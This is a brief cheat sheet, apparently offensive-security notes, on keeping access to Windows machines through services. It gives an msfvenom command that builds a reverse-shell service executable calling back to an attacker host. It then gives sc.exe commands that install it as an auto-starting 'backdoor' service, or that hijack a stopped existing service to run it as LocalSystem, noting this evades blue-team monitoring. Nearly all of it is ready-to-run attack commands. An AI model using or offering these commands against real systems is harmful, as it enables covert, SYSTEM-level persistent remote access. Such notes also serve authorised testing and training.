[sc](reg#sc)
### Creating New Services
```powershell
# Create a reverse shell using msfvenom, with exe-service, as service executables are different from normal executables
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe-service -o rev-svc.exe

# Crate a service
sc.exe create backdoor binpath= "C:\path\to\reverse\shell.exe" start= auto
sc.exe start backdoor
```
### Modifying Existing Services
- Usefull when blue team is monitoring new services
- Look for `Stopped` services.
```powershell
sc.exe query state=all
```
- check configuration
```powershell
sc.exe query Stopped_Service
sc.exe config Stopped_Service binpath= "C:\Reverse\Shell.exe" start= auto obj= "LocalSystem"
# Setting obj to LocalSystem runs the service with SYSTEM Privilege
```